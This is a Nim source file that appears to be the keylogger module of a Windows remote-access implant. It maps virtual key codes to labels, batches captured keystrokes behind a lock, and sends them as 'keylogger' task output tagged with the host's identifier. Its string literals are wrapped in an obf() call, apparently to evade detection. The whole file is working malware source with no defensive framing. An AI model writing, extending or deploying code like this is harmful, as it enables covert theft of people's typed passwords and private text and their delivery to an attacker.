import std/json
from std/locks import Lock, initLock, acquire, release
from std/random import rand
from std/strutils import join, parseInt, startsWith, strip, toHex, toLowerAscii
import ../../utils/global
import ../../utils/tasks/buffer
import ../../utils/winapi/handlers

const
  vkFirst* = 0x08
  vkLast* = 0xFE
  keyloggerIdleMs* = 3_000'u64
  defaultBoardPollMs* = 50'u32
  cmInvalid* = 0
  cmKeystate* = 1
  cmBoardstate* = 2

var
  boardPollMs* = defaultBoardPollMs
  active* = false
  parked* = true
  th* : pointer = nil
  captureMode* = cmBoardstate
  threadWorkerMode* = cmInvalid
  batch* : seq[string]
  klMtx* : Lock
  klReady* = false
  klOutParams* = obf("{}")
  klStreamTag* = ""
  klFlushSeq* = 0'u32
  klLastKeyMs* = 0'u64

proc ensureKlMtx*() =
  # Initializes the key logger lock once
  if not klReady:
    initLock(klMtx)
    klReady = true

proc vkLabel*(vk: int32): string =
  # Maps a virtual key code to a text label
  if vk >= 0x41 and vk <= 0x5A: result = ($char(vk)).toLowerAscii()
  elif vk >= 0x30 and vk <= 0x39: result = $char(vk)
  else:
    case vk
    of 0x08: result = obf("backspace")
    of 0x09: result = obf("tab")
    of 0x0D: result = obf("enter")
    of 0x1B: result = obf("esc")
    of 0x20: result = obf("space")
    of 0x25: result = obf("left")
    of 0x26: result = obf("up")
    of 0x27: result = obf("right")
    of 0x28: result = obf("down")
    of 0x2E: result = obf("delete")
    else: result = obf("vk_") & toHex(vk, 2)

proc fmtKey*(label: string): string =
  # Formats a key label for the captured batch
  case label
  of obf("backspace"), obf("tab"), obf("enter"), obf("esc"), obf("space"),
     obf("left"), obf("up"), obf("right"), obf("down"), obf("delete"):
    obf(" <") & label & obf("> ")
  else:
    if label.startsWith(obf("vk_")): obf(" <") & label & obf("> ")
    else: label

proc flushBatch*() =
  # Sends the buffered keys as task output
  acquire(klMtx)
  if batch.len == 0:
    release(klMtx)
    return
  let content = batch.join(obf("")) & " "
  batch.setLen(0)
  release(klMtx)
  inc klFlushSeq
  var outTag = klStreamTag
  if outTag.len == 0:
    outTag = $rand(100_000_000 .. 999_999_999)
  outTag = outTag & obf("-") & $klFlushSeq
  discard apply_task_output($(%*{
    obf("option"): obf("output"),
    obf("type"): obf("keylogger"),
    obf("task_tag"): outTag,
    obf("host_tag"): hostTag,
    obf("content"): content,
  }), klOutParams)

proc addKey*(label: string) =
  # Stores a formatted key in the batch
  acquire(klMtx)
  batch.add fmtKey(label)
  klLastKeyMs = getTickCount64()
  release(klMtx)

proc waitParked*() =
  # Waits until the worker thread is parked
  if th == nil:
    return
  for _ in 0 ..< 500:
    ensureKlMtx()
    acquire(klMtx)
    let p = parked
    release(klMtx)
    if p:
      break
    sleepMs(10)

proc parseBoardPollMs*(params: string) =
  # Reads the board poll delay from params
  boardPollMs = defaultBoardPollMs
  if params.len == 0:
    return
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("delay")):
      return
    let n = p[obf("delay")]
    var ms = 0
    if n.kind == JInt:
      ms = n.getInt()
    elif n.kind == JFloat:
      ms = n.getFloat().int
    else:
      ms = parseInt(n.getStr().strip())
    if ms > 0:
      boardPollMs = ms.uint32
  except JsonParsingError:
    discard
  except ValueError:
    discard

proc parseCaptureMethod*(params: string): int =
  # Reads the capture method from params
  if params.len == 0:
    return cmBoardstate
  try:
    let p = parseJson(params)
    let raw =
      if p.hasKey(obf("method")): p[obf("method")].getStr()
      else: obf("boardstate")
    let m = raw.strip().toLowerAscii()
    if m.len == 0:
      return cmBoardstate
    if m == obf("keystate"): cmKeystate
    elif m == obf("boardstate"): cmBoardstate
    else: cmInvalid
  except JsonParsingError:
    cmInvalid
  except ValueError:
    cmInvalid

proc stopWorker*() =
  # Stops the worker and flushes the remaining keys
  ensureKlMtx()
  acquire(klMtx)
  active = false
  release(klMtx)
  waitParked()
  flushBatch()
